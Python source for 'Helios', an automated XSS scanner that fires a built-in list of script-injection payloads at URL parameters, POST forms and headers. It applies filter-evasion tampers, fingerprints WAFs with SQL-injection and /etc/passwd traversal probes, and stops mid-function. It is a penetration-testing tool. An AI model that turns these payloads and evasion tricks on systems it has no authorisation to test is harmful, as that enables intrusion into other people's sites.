#!/usr/bin/env python3
"""
Helios v0.4 - Automated XSS Scanner
Modernized for 2026 | Arch Linux / Hyprland compatible
"""

import argparse
import asyncio
import hashlib
import json
import random
import re
import shutil
import string
import sys
import threading
import time
import urllib.parse
import uuid
import warnings
from collections import deque
from concurrent.futures import ThreadPoolExecutor
from functools import wraps

import aiohttp
import uvloop
from aiohttp import ClientSession
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
from selenium import webdriver
from selenium.common.exceptions import (
    TimeoutException,
    UnexpectedAlertPresentException,
    WebDriverException,
)
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select, WebDriverWait

warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)


# ─────────────────────────────────────────────────────────────────────────────
# Colours
# ─────────────────────────────────────────────────────────────────────────────

class bcolors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[94m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'
    PARAM     = '\033[96m'
    PURPLE    = '\033[95m'


def banner():
    print(f'''




                                                                                    
 {bcolors.FAIL}∞                                                                         π      ∞ 
   ∞                     ∞                                                      ∞   
     ∞                                       π                                ∞     
      ∞∞            ∞                 ∞                                     ∞∞      
        ∞∞                          ∞∞∞∞∞∞∞∞∞∞∞∞                          ∞∞        
          ∞∞                 ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞                  ∞∞          
            ∞π            ∞∞∞∞∞∞∞∞∞∞∞          ∞∞∞∞∞∞∞∞∞∞∞            ∞∞         ∞  
              ∞ π      ∞∞π∞∞∞∞∞       ∞     π   π    ∞∞∞∞∞π∞∞       ∞∞        π     
   π            ∞   ∞∞∞∞∞∞∞π         πππππ∞ππ ∞   π      ∞∞∞∞∞∞π   ∞                
                  ∞∞∞∞∞∞    ∞    π∞  ππ∞π∞π     ππ∞π        ∞∞∞∞∞∞                  
                ∞∞∞∞∞∞   ∞  ∞ππ ∞        ππ       ∞ ππ∞       ∞∞∞∞∞                 
               ∞∞∞∞∞ ∞∞   πππ∞ ∞      ∞∞∞∞∞∞∞∞∞π     ∞ ∞∞∞   ∞∞ ∞∞∞∞∞    ∞π  ∞      
             π∞∞∞∞    π∞∞π       ∞∞∞∞π∞∞∞∞∞∞∞∞ π∞∞π    π π∞∞∞    π∞∞∞∞        ∞     
            ∞∞∞∞∞      ∞π∞∞    ∞∞∞∞∞  π∞    ∞  ∞∞∞∞∞∞π  π∞∞∞π      ∞∞∞∞π            
           ∞∞∞∞∞  ∞  πππ   ∞∞∞∞∞∞  ∞ ∞ ∞π   ∞ ∞ ∞  ∞π∞∞∞∞π  ∞ ∞     ∞∞∞∞            
          ∞∞∞∞∞     ππ π  ∞ ∞∞∞ ∞∞  ∞π ∞πππ∞∞  ∞  ∞ π∞∞∞      ∞∞     ∞∞∞∞           
          ∞∞∞∞    π ∞ π   ∞∞∞∞∞∞∞ ∞∞ ∞∞ ∞π∞∞π∞∞ ∞∞ ∞∞∞∞∞∞π    π∞∞     ∞∞∞∞          
      π  ∞∞∞∞  π∞ π∞     ∞∞∞∞∞∞π ∞∞ ∞∞∞π∞∞∞∞∞ ∞∞ ∞∞ ∞∞∞ππ∞∞    ππ  π   ∞∞∞∞         
         ∞∞∞π    π∞     ∞  ∞∞∞∞∞∞∞∞ππ∞∞∞∞∞∞∞∞∞∞πππ∞∞∞∞∞∞∞∞∞∞  ∞  π     ∞∞∞∞         
        π∞∞∞      π     ∞∞∞∞     ∞∞π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞   ∞∞∞∞∞∞    ππ      ∞∞∞         
        ∞∞∞∞     π∞ ∞  ∞∞∞∞∞πππ∞∞∞π∞∞  {bcolors.BOLD}{bcolors.HEADER}HELIOS{bcolors.ENDC}{bcolors.FAIL}  ∞∞ ∞∞∞ππ∞∞∞π∞∞  π  ∞     ∞∞∞∞{bcolors.ENDC}        
 {bcolors.BOLD}∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ππ   ∞∞∞∞ ∞ππ∞∞{bcolors.BOLD}{bcolors.WARNING}v0.4{bcolors.ENDC}{bcolors.BOLD}ππππ∞π∞∞∞∞   ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞  
        ∞∞∞      ∞π    ∞∞∞∞πππππ∞∞ ∞∞∞∞∞∞∞∞π∞∞∞∞∞ ∞ππ∞∞∞∞∞∞∞∞   π ∞     π∞∞∞        
        ∞∞∞∞     ∞     π∞∞∞π∞∞∞∞∞∞  ππ∞∞∞∞π∞π∞π∞ ∞π∞∞∞∞∞∞∞∞∞∞     ∞     π∞∞∞        
        ∞∞∞∞     π     ∞∞∞∞∞   ∞∞∞∞∞ π∞∞∞∞∞ ∞∞π  ∞∞∞∞   ∞∞∞∞π π   ∞     ∞∞∞∞        
        ∞∞∞∞   π π∞     ∞∞∞∞∞∞∞  ∞∞ ∞ ∞∞∞π π∞∞ ∞∞∞∞ ∞∞∞∞∞∞∞π   π ∞π    ∞∞∞∞         
         ∞∞∞     ∞       ∞∞∞∞∞ ∞∞ ∞∞∞∞ π∞ ππ∞ π∞∞ ∞∞∞π∞∞∞∞∞     ∞∞ π   ∞∞∞∞         
         ∞∞∞∞  π   π      ∞ ∞∞∞ ∞∞∞ ∞ ∞∞∞π∞∞ ∞ ∞∞∞∞ ∞∞∞∞π∞     ππ∞     ∞∞∞          
          ∞∞∞∞  ∞   ∞      ∞∞∞∞∞π∞ ∞∞ ∞π∞∞∞∞π∞∞ ∞∞π ∞∞∞ππ   π  ππ     ∞∞∞∞          
           ∞∞∞∞    π∞∞π   ∞ ∞∞∞∞∞∞∞∞∞π∞ ∞π∞∞∞ ∞ ∞π∞∞∞∞∞∞   π  ∞∞     ∞∞∞∞           
         π  ∞∞∞∞   ∞ ∞ π  ∞    ∞∞∞∞∞∞∞ ∞∞∞∞∞∞ ∞∞∞∞∞π∞   ∞∞  ππ      ∞∞∞∞            
             ∞∞∞∞π     π∞ ∞       ∞∞∞∞∞∞π∞∞∞∞ ∞∞∞∞        ∞∞∞     ∞∞∞∞∞     ∞       
              ∞∞∞∞∞   ∞∞  ∞∞         ∞  ∞∞∞π  ∞         ∞π  π∞   ∞∞π∞∞              
                ∞∞∞∞∞π      π∞π   π      ∞π         ∞ππ ∞     π∞∞∞∞∞                
  ∞    π         π∞∞∞∞∞         π∞π  π∞  π   ∞∞π ∞ π         ∞∞∞∞∞                  
                ∞∞ π∞∞∞∞∞∞         ∞π    ππππ   ∞        π∞∞∞∞∞∞  ∞∞                
              ∞∞      ∞∞∞∞∞∞∞                         π∞∞∞∞∞∞∞      ∞∞              
            ∞∞           ∞∞∞π∞∞∞∞∞∞              ∞∞∞∞∞∞∞∞∞∞           ∞∞            
    π      ∞                π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞π∞∞∞∞∞∞π                ∞π          
         ∞         ∞∞             ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞              π         ∞π        
       ∞                                            π             ∞         ∞       
     ∞π π                                  ∞                        ∞         ∞     
   ∞π                                                                 π         ∞   
 ∞∞                                                                               ∞{bcolors.ENDC}
                                                                                    
                            {bcolors.BOLD}{bcolors.WARNING}Helios - Automated XSS Scanner{bcolors.ENDC}
                    {bcolors.BOLD}{bcolors.PURPLE}Author: {bcolors.ENDC}{bcolors.BOLD}@stuub   |   {bcolors.BOLD}{bcolors.PURPLE}Github: {bcolors.ENDC}{bcolors.BOLD}https://github.com/stuub{bcolors.ENDC}
                    {bcolors.BOLD}{bcolors.OKBLUE}Arch Linux / Hyprland edition – v0.4 (2026){bcolors.ENDC}

    ''')


# ─────────────────────────────────────────────────────────────────────────────
# Exceptions
# ─────────────────────────────────────────────────────────────────────────────

class BrowserNotFoundError(Exception):
    pass


# ─────────────────────────────────────────────────────────────────────────────
# Tamper techniques
# ─────────────────────────────────────────────────────────────────────────────

class TamperTechniques:
    @staticmethod
    def double_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def uppercase(payload: str) -> str:
        return ''.join(c.upper() if random.choice([True, False]) else c for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        return ''.join(f'%{ord(c):02X}' for c in payload)

    @staticmethod
    def json_fuzz(payload: str) -> str:
        return json.dumps(payload)[1:-1]

    @staticmethod
    def space_to_tab(payload: str) -> str:
        return payload.replace(' ', '\t')

    @staticmethod
    def unicode_escape(payload: str) -> str:
        """New 2026 tamper: unicode-escape HTML entities."""
        return ''.join(f'\\u{ord(c):04x}' if c.isalpha() else c for c in payload)

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        """Insert null bytes between tag chars to bypass naive filters."""
        return payload.replace('<', '<\x00').replace('>', '\x00>')


_TAMPER_MAP = {
    'doubleencode':   TamperTechniques.double_encode,
    'uppercase':      TamperTechniques.uppercase,
    'hexencode':      TamperTechniques.hex_encode,
    'jsonfuzz':       TamperTechniques.json_fuzz,
    'spacetab':       TamperTechniques.space_to_tab,
    'unicode':        TamperTechniques.unicode_escape,
    'nullbyte':       TamperTechniques.null_byte_inject,
}


def apply_tamper(payload: str, technique: str) -> str:
    if technique == 'all':
        result = payload
        for fn in _TAMPER_MAP.values():
            result = fn(result)
        return result
    fn = _TAMPER_MAP.get(technique)
    return fn(payload) if fn else payload


# ─────────────────────────────────────────────────────────────────────────────
# XSSScanner
# ─────────────────────────────────────────────────────────────────────────────

class XSSScanner:
    # Browser configs for Arch: prefer system-installed chromium / firefox.
    # webdriver-manager is kept as fallback but we try the system binary first.
    def __init__(
        self,
        target_url: str,
        browser_type: str,
        headless: bool,
        threads: int,
        custom_headers: dict,
        cookies: dict,
        output_file: str | None,
        payload_file: str | None,
        tamper: str | None,
    ):
        self.target_url      = target_url
        self.headless        = headless
        self.browser_type    = browser_type.lower()
        self.threads         = threads
        self.custom_headers  = custom_headers
        self.cookies         = cookies
        self.output_file     = output_file
        self.payload_file    = payload_file
        self.tamper          = tamper

        # Runtime state
        self.verbose            = False
        self.skip_header_scan   = True
        self.crawl              = False
        self.crawl_depth        = 2
        self.scanned_urls: set  = set()
        self.discovered_urls: set = set()
        self.detected_wafs: list = []
        self.canary_string      = uuid.uuid4().hex[:8]
        self.lock               = threading.Lock()
        self.payload_identifiers: dict = {}
        self.payloads           = self.load_payloads()
        self.session: aiohttp.ClientSession | None = None
        self.driver             = None
        self.request_times      = deque(maxlen=1000)
        self.vulnerabilities_found: list = []
        self.current_rps        = 0
        self.rps_monitor_running = False
        self.rps_thread         = None
        self.rps_print_thread   = None
        self.terminal_width     = shutil.get_terminal_size().columns

    # ── session ──────────────────────────────────────────────────────────────

    async def create_session(self):
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(ssl=False, limit=self.threads)
            timeout   = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(
                headers=self.custom_headers,
                cookies=self.cookies,
                connector=connector,
                timeout=timeout,
            )

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None

    async def cleanup(self):
        self.print_and_save("\n[*] Cleaning up...", important=True)
        self.stop_rps_monitor()
        if self.driver:
            try:
                await asyncio.to_thread(self.driver.quit)
            except Exception:
                pass
            self.driver = None
        await self.close_session()
        self.print_and_save("[*] Cleanup complete.", important=True)

    # ── driver setup ─────────────────────────────────────────────────────────

    def _build_driver_firefox(self) -> webdriver.Firefox:
        opts = FirefoxOptions()
        if self.headless:
            opts.add_argument("--headless")
        # Arch: geckodriver from AUR/pacman – try system PATH first
        geckodriver = shutil.which("geckodriver")
        if geckodriver:
            svc = FirefoxService(executable_path=geckodriver)
        else:
            from webdriver_manager.firefox import GeckoDriverManager
            svc = FirefoxService(GeckoDriverManager().install())
        return webdriver.Firefox(service=svc, options=opts)

    def _build_driver_chromium(self) -> webdriver.Chrome:
        opts = ChromeOptions()
        opts.binary_location = shutil.which("chromium") or shutil.which("chromium-browser") or ""
        if self.headless:
            opts.add_argument("--headless=new")   # new headless API (Chrome 112+)
        # Wayland / Hyprland: these flags prevent crashes
        for flag in (
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-software-rasterizer",
            "--ozone-platform=wayland",   # Hyprland native
        ):
            opts.add_argument(flag)

        chromedriver = shutil.which("chromedriver")
        if chromedriver:
            svc = ChromeService(executable_path=chromedriver)
        else:
            from webdriver_manager.chrome import ChromeDriverManager
            svc = ChromeService(ChromeDriverManager().install())
        return webdriver.Chrome(service=svc, options=opts)

    def _build_driver_chrome(self) -> webdriver.Chrome:
        opts = ChromeOptions()
        if self.headless:
            opts.add_argument("--headless=new")
        for flag in (
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--ozone-platform=wayland",
        ):
            opts.add_argument(flag)
        chromedriver = shutil.which("chromedriver")
        if chromedriver:
            svc = ChromeService(executable_path=chromedriver)
        else:
            from webdriver_manager.chrome import ChromeDriverManager
            svc = ChromeService(ChromeDriverManager().install())
        return webdriver.Chrome(service=svc, options=opts)

    def setup_driver(self):
        builders = {
            'firefox':  self._build_driver_firefox,
            'chromium': self._build_driver_chromium,
            'chrome':   self._build_driver_chrome,
        }
        builder = builders.get(self.browser_type)
        if builder is None:
            raise ValueError(f"Unsupported browser: {self.browser_type}")

        try:
            driver = builder()
            driver.get(self.target_url)
            for name, value in self.cookies.items():
                driver.add_cookie({'name': name, 'value': value})
            return driver
        except WebDriverException as exc:
            self.print_and_save(f"[!] WebDriver error: {exc}", important=True)
            return None

    # ── RPS monitor ──────────────────────────────────────────────────────────

    def start_rps_monitor(self):
        self.rps_monitor_running = True
        self.rps_thread = threading.Thread(target=self._rps_loop, daemon=True)
        self.rps_thread.start()
        self.rps_print_thread = threading.Thread(target=self._rps_print_loop, daemon=True)
        self.rps_print_thread.start()

    def stop_rps_monitor(self):
        self.rps_monitor_running = False
        if self.rps_thread:
            self.rps_thread.join(timeout=2)
        if self.rps_print_thread:
            self.rps_print_thread.join(timeout=2)

    def _rps_loop(self):
        while self.rps_monitor_running:
            cutoff = time.time() - 1
            with self.lock:
                self.request_times = deque(
                    (t for t in self.request_times if t > cutoff), maxlen=1000
                )
                self.current_rps = len(self.request_times)
            time.sleep(0.1)

    def _rps_print_loop(self):
        while self.rps_monitor_running:
            total = len(self.request_times)
            sys.stdout.write(
                f"\r{bcolors.BOLD}[{bcolors.ENDC}"
                f"{bcolors.PURPLE}RPS: {self.current_rps} | Requests: {total}"
                f"{bcolors.ENDC}{bcolors.BOLD}]{bcolors.ENDC}"
            )
            sys.stdout.flush()
            time.sleep(0.5)

    def log_request(self):
        with self.lock:
            self.request_times.append(time.time())

    # ── page helpers ─────────────────────────────────────────────────────────

    async def smart_wait(self, timeout: int = 10):
        try:
            await asyncio.wait_for(
                asyncio.to_thread(
                    lambda: WebDriverWait(self.driver, timeout).until(
                        lambda d: d.execute_script('return document.readyState') == 'complete'
                    )
                ),
                timeout=float(timeout),
            )
        except (asyncio.TimeoutError, Exception):
            pass

    async def wait_for_page_stability(self, timeout: int = 10, interval: float = 0.5) -> bool:
        start = time.time()
        last = await asyncio.to_thread(lambda: self.driver.page_source)
        while time.time() - start < timeout:
            await asyncio.sleep(interval)
            current = await asyncio.to_thread(lambda: self.driver.page_source)
            if current == last:
                return True
            last = current
        return False

    # ── payload management ───────────────────────────────────────────────────

    def load_payloads(self) -> list:
        if self.payload_file:
            try:
                with open(self.payload_file, 'r', encoding='utf-8') as fh:
                    payloads = [l.strip() for l in fh if l.strip()]
                self.print_and_save(f"[*] Loaded {len(payloads)} payloads from {self.payload_file}")
                self.extract_payload_identifiers(payloads)
                return payloads
            except Exception as exc:
                self.print_and_save(f"[!] Error loading payload file: {exc}", important=True)
        return self._default_payloads()

    def _default_payloads(self) -> list:
        """Expanded 2026 default payload set."""
        return [
            # Classic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            # Tag-breaking
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            # Filter-evasion (modern browsers still honour these)
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<svg><script>alert&#40;'XSS'&#41;</script>",
            # Template injection overlap
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
            # CSP-bypass helpers (nonce-less same-origin)
            "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
            # Mutation XSS
            "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">",
            # DOM clobbering seed
            "<form id=x><input name=y value=z>",
        ]

    def extract_payload_identifiers(self, payloads: list):
        for payload in payloads:
            m = re.search(r"alert\(['\"](.+?)['\"]", payload)
            key = m.group(1) if m else uuid.uuid4().hex[:8]
            self.payload_identifiers[key] = payload

    def customize_payload(self, payload: str) -> str:
        customized = payload.replace("alert('XSS')", f"alert('{self.canary_string}')")
        customized = customized.replace(
            f"alert('{self.canary_string}')",
            f"window.xss_test=true;alert('{self.canary_string}')"
        )
        if self.tamper:
            customized = apply_tamper(customized, self.tamper)
        return customized

    # ── output helpers ───────────────────────────────────────────────────────

    def print_and_save(self, message: str, important: bool = False):
        if not (self.verbose or important):
            return
        with self.lock:
            message = self._color_parameters(message)
            for line in message.split('\n'):
                if important:
                    self._print_important(line)
                else:
                    self._print_status(line)
            if self.output_file:
                clean = self._strip_ansi(message)
                with open(self.output_file, 'a', encoding='utf-8') as fh:
                    fh.write(clean + '\n')

    def _color_parameters(self, msg: str) -> str:
        return re.sub(r'(parameter:\s*)(\w+)', fr'\1{bcolors.PARAM}\2{bcolors.ENDC}', msg)

    @staticmethod
    def _strip_ansi(text: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', text)

    def _fmt_line(self, msg: str) -> str:
        if msg.startswith('[*]'):
            return f"{bcolors.OKBLUE}[*]{bcolors.ENDC}{msg[3:]}"
        if msg.startswith('[+]'):
            return f"{bcolors.OKGREEN}[+]{bcolors.ENDC}{msg[3:]}"
        if msg.startswith('[!]'):
            return f"{bcolors.FAIL}[!]{bcolors.ENDC}{msg[3:]}"
        if msg.startswith('[-]'):
            return f"{bcolors.WARNING}[-]{bcolors.ENDC}{msg[3:]}"
        return msg

    def _print_status(self, msg: str):
        w = shutil.get_terminal_size().columns
        formatted = self._fmt_line(msg)
        sys.stdout.write(f"\r{' ' * w}\r{formatted}\n")
        sys.stdout.flush()

    def _print_important(self, msg: str):
        w = shutil.get_terminal_size().columns
        formatted = self._fmt_line(msg)
        sys.stdout.write(f"\r{' ' * w}\r")
        print(formatted)
        sys.stdout.flush()

    # ── WAF detection ────────────────────────────────────────────────────────

    async def detect_waf(self):
        waf_signatures = {
            'Cloudflare':          ['cf-ray', '__cfduid', 'cf-cache-status'],
            'Akamai':              ['akamai-gtm', 'ak_bmsc'],
            'Incapsula':           ['incap_ses', 'visid_incap'],
            'Sucuri':              ['sucuri-clientside'],
            'ModSecurity':         ['mod_security'],
            'F5 BIG-IP':           ['BIGipServer'],
            'Barracuda':           ['barra_counter_session'],
            'Citrix NetScaler':    ['ns_af=', 'citrix_ns_id'],
            'AWS WAF':             ['x-amz-cf-id', 'x-amzn-RequestId'],
            'Wordfence':           ['wordfence_verifiedHuman'],
            'FortiWeb':            ['FORTIWAFSID='],
            'Imperva':             ['X-Iinfo'],
            'Varnish':             ['X-Varnish'],
            'Fastly':              ['Fastly-SSL'],
            'Cloudfront':          ['X-Cache: Miss from cloudfront'],
        }
        detected: set = set()

        try:
            async with self.session.get(self.target_url) as resp:
                headers = {k.lower(): v for k, v in resp.headers.items()}
                for waf, sigs in waf_signatures.items():
                    if any(s.lower() in headers for s in sigs):
                        detected.add(waf)
        except Exception as exc:
            self.print_and_save(f"[!] WAF header check error: {exc}", important=True)

        # Behavioural probes
        probe_payloads = [
            "/?q=<script>alert(1)</script>",
            "/?id=1' OR '1'='1",
            "/../../../etc/passwd",
        ]
        for probe in probe_payloads:
            try:
                async with self.session.get(
                    self.target_url.rstrip('/') + probe, allow_redirects=False
                ) as resp:
                    if resp.status in (403, 406, 429, 503):
                        detected.add("Unknown WAF (HTTP status block)")
                        break
                    body = await resp.text()
                    if any(k in body.lower() for k in ('firewall', 'blocked', 'malicious', 'waf')):
                        detected.add("Generic WAF (body keyword)")
                        break
            except Exception:
                pass

        if detected:
            self.print_and_save(f"[!] WAF detected: {', '.join(detected)}", important=True)
        else:
            self.print_and_save("[*] No WAF detected.")
        self.detected_wafs = list(detected)
        return self.detected_wafs

    # ── alert / exploitation ─────────────────────────────────────────────────

    def _async_handle_alerts(func):
        @wraps(func)
        async def wrapper(self, *args, **kwargs):
            try:
                return await func(self, *args, **kwargs)
            except Exception as exc:
                if "UnexpectedAlert" in type(exc).__name__ or "UnexpectedAlert" in str(exc):
                    try:
                        alert = await asyncio.to_thread(lambda: self.driver.switch_to.alert)
                        text  = await asyncio.to_thread(lambda: alert.text)
                        if self.canary_string in text:
                            self.print_and_save(
                                f"[+] XSS confirmed via unexpected alert! canary={self.canary_string}",
                                important=True,
                            )
                            await asyncio.to_thread(alert.accept)
                            return True
                        await asyncio.to_thread(alert.accept)
                        return None
                    except Exception:
                        pass
                raise
        return wrapper

    async def _dismiss_any_alert(self) -> str | None:
        """Accept any present alert and return its text, or None."""
        try:
            alert = await asyncio.wait_for(
                asyncio.to_thread(
                    WebDriverWait(self.driver, 2).until, EC.alert_is_present()
                ),
                timeout=3.0,
            )
            text = await asyncio.to_thread(lambda: alert.text)
            await asyncio.to_thread(alert.accept)
            return text
        except (asyncio.TimeoutError, Exception):
            return None

    async def quick_check_exploitation(self, payload: str) -> dict:
        result = {'xss': False, 'sql_injection': False, 'reflection': False, 'details': []}

        # Alert check
        alert_text = await self._dismiss_any_alert()
        if alert_text is not None:
            result['xss'] = True
            result['details'].append(f"Alert: {alert_text}")

        # Page source
        try:
            page_source = await asyncio.to_thread(lambda: self.driver.page_source)
        except UnexpectedAlertPresentException:
            text = await self._dismiss_any_alert()
            if text:
                result['xss'] = True
                result['details'].append(f"Alert (on page-source fetch): {text}")
            try:
                page_source = await asyncio.to_thread(lambda: self.driver.page_source)
            except Exception:
                page_source = ""

        if payload in page_source:
            result['reflection'] = True
            result['details'].append("Payload reflected in page source")

        # JS execution flag
        try:
            xss_flag = await asyncio.to_thread(
                self.driver.execute_script, "return window.xss_test;"
            )
            if xss_flag:
                result['xss'] = True
                result['details'].append("window.xss_test set (script executed)")
        except Exception:
            pass

        # SQL error patterns
        sql_patterns = [
            r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_",
            r"ORA-[0-9]{4}", r"PostgreSQL.*?ERROR",
            r"PG::SyntaxError", r"SQLite.*?Exception",
            r"\[SQL Server\]", r"ODBC.*?Driver",
        ]
        for pat in sql_patterns:
            if re.search(pat, page_source, re.IGNORECASE):
                result['sql_injection'] = True
                m = re.search(pat, page_source, re.IGNORECASE)
                result['details'].append(f"SQL error: {m.group(0)[:80]}")
                break

        return result

    # ── scanning methods ─────────────────────────────────────────────────────

    async def scan_url_parameters(self) -> list:
        results = []
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        for param, values in params.items():
            for payload in self.payloads:
                test_url = self.target_url.replace(
                    f"{param}={values[0]}",
                    f"{param}={urllib.parse.quote(self.customize_payload(payload))}",
                )
                self.print_and_save(
                    f"[*] GET param {bcolors.PARAM}{param}{bcolors.ENDC} → {bcolors.WARNING}{payload}{bcolors.ENDC}"
                )
                result = await self._test_get_url(test_url, payload)
                if result:
                    self.print_and_save(
                        f"[+] XSS confirmed in GET param: {param}", important=True
                    )
                    self.vulnerabilities_found.append({
                        'type': 'Reflected XSS',
                        'method': 'GET',
                        'url': test_url,
                        'payload': payload,
                        'parameter': param,
                    })
        return results

    async def _test_get_url(self, url: str, payload: str) -> bool:
        try:
            await asyncio.to_thread(self.driver.get, url)
            self.log_request()
            r = await self.quick_check_exploitation(payload)
            return r['xss']
        except Exception:
            return False

    async def scan_post_parameters(self) -> list:
        results = []
        try:
            async with self.session.get(self.target_url) as resp:
                content = await resp.text()
        except Exception as exc:
            self.print_and_save(f"[!] Could not fetch page for POST scan: {exc}", important=True)
            return results

        soup  = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')

        for idx, form in enumerate(forms):
            action = form.get('action', self.target_url)
            if not action.startswith(('http://', 'https://')):
                action = urllib.parse.urljoin(self.target_url, action)
            method = form.get('method', 'get').lower()
            if method != 'post':
                continue
            params = {
                el.get('name'): ''
                for el in form.find_all(['input', 'textarea', 'select'])
                if el.get('name')
            }
            results.append(f"[*] Testing POST form #{idx + 1} with {len(params)} params")
            await self._test_post_params(action, params)
        return results

    async def _test_post_params(self, url: str, params: dict):
        for param in params:
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = self.customize_payload(payload)
                self.print_and_save(
                    f"[*] POST param {bcolors.PARAM}{param}{bcolors.ENDC} → {bcolors.WARNING}{payload}{bcolors.ENDC}"
                )
                if await self._fill_and_submit_form(url, test_params, payload):
                    self.print_and_save(
                        f"[+] XSS confirmed in POST param: {param}", important=True
                    )
                    self.vulnerabilities_found.append({
                        'type': 'Reflected XSS (POST)',
                        'method': 'POST',
                        'url': url,
                        'payload': payload,
                        'parameter': param,
                    })

    async def _fill_and_submit_form(self, url: str, data: dict, original_payload: str) -> bool:
        try:
            await asyncio.to_thread(self.driver.get, url)
            self.log_request()
            for name, value in data.items():
                try:
                    el = await asyncio.to_thread(
                        WebDriverWait(self.driver, 5).until,
                        EC.presence_of_element_located((By.NAME, name))
                    )
                    tag  = await asyncio.to_thread(lambda: el.tag_name.lower())
                    typ  = await asyncio.to_thread(lambda: (el.get_attribute('type') or '').lower())
                    if tag == 'select':
                        sel = Select(el)
                        try:
                            await asyncio.to_thread(sel.select_by_visible_text, value)
                        except Exception:
                            pass
                    elif tag == 'input' and typ in ('submit', 'button', 'reset', 'image'):
                        pass
                    else:
                        await asyncio.to_thread(el.clear)
                        await asyncio.to_thread(el.send_keys, value)
                except Exception:
                    pass

            # Click submit
            try:
                btn = await asyncio.to_thread(
                    WebDriverWait(self.driver, 5).until,
                    EC.element_to_be_clickable(
                        (By.XPATH, "//input[@type='submit'] | //button[@type='submit'] | //button[not(@type)]")
                    )
                )
                await asyncio.to_thread(btn.click)
                await asyncio.sleep(1.5)
            except Exception:
                pass

            r = await self.quick_check_exploitation(original_payload)
            return r['xss']
        except Exception:
            return False

    async def scan_dom_content(self) -> list:
        results = []
        self.print_and_save("[*] Scanning for DOM-based XSS")
        try:
            async with self.session.get(self.target_url) as resp:
                content = await resp.text()
        except Exception:
            return results

        soup    = BeautifulSoup(content, 'html.parser')
        scripts = soup.find_all('script')

        for script in scripts:
            if script.get('src'):
                src = urllib.parse.urljoin(self.target_url, script['src'])
                await self._test_dom_xss(None, is_external=True, script_url=src)
            elif script.string:
                await self._test_dom_xss(script.string)

        for tag in soup.find_all(True):
            for attr in tag.attrs:
                if attr.lower().startswith('on'):
                    await self._test_dom_xss(str(tag[attr]))

        return results

    async def _test_dom_xss(
        self,
        content: str | None,
        is_external: bool = False,
        script_url: str | None = None,
    ) -> bool:
        if is_external and script_url:
            self.print_and_save(f"[*] Analysing external script: {script_url}")
            try:
                async with self.session.get(script_url) as resp:
                    content = await resp.text()
            except Exception:
                return False

        if not content:
            return False

        sources = [
            "document.URL", "document.documentURI", "document.baseURI",
            "location", "location.href", "location.search", "location.hash",
            "document.cookie", "document.referrer", "window.name",
            "history.pushState", "history.replaceState",
            "localStorage", "sessionStorage",
        ]
        sinks = [
            "eval", "setTimeout", "setInterval", "setImmediate",
            "innerHTML", "outerHTML", "insertAdjacentHTML",
            "document.write", "document.writeln",
            "ScriptElement.src", "ScriptElement.text",
        ]

        location = "external script" if is_external else "inline script"
        found = False

        for source in sources:
            for sink in sinks:
                pat = re.compile(
                    r'{}.*?{}'.format(re.escape(source), re.escape(sink)),
                    re.IGNORECASE | re.DOTALL,
                )
                if pat.search(content):
                    self.print_and_save(
                        f"[+] Potential DOM XSS in {location}: "
                        f"{bcolors.OKGREEN}{source} → {sink}{bcolors.ENDC}",
                        important=True,
                    )
                    found = True

        # Vulnerable function patterns
        for pat_str, fn_name in (
            (r'document\.write\s*\(', "document.write"),
            (r'\.innerHTML\s*=', "innerHTML"),
            (r'\.outerHTML\s*=', "outerHTML"),
            (r'\.insertAdjacentHTML\s*\(', "insertAdjacentHTML"),
            (r'eval\s*\(', "eval"),
            (r'setTimeout\s*\(.*?,', "setTimeout(string,"),
        ):
            if re.search(pat_str, content, re.IGNORECASE):
                self.print_and_save(
                    f"[+] Potential DOM sink in {location}: {bcolors.OKGREEN}{fn_name}{bcolors.ENDC}",
                    important=True,
                )
                if is_external:
                    self.print_and_save(f"    Script: {script_url}")
                found = True

        return found

    async def scan_headers(self) -> list:
        results = []
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host']
        for header in headers_to_test:
            for payload in self.payloads:
                self.print_and_save(
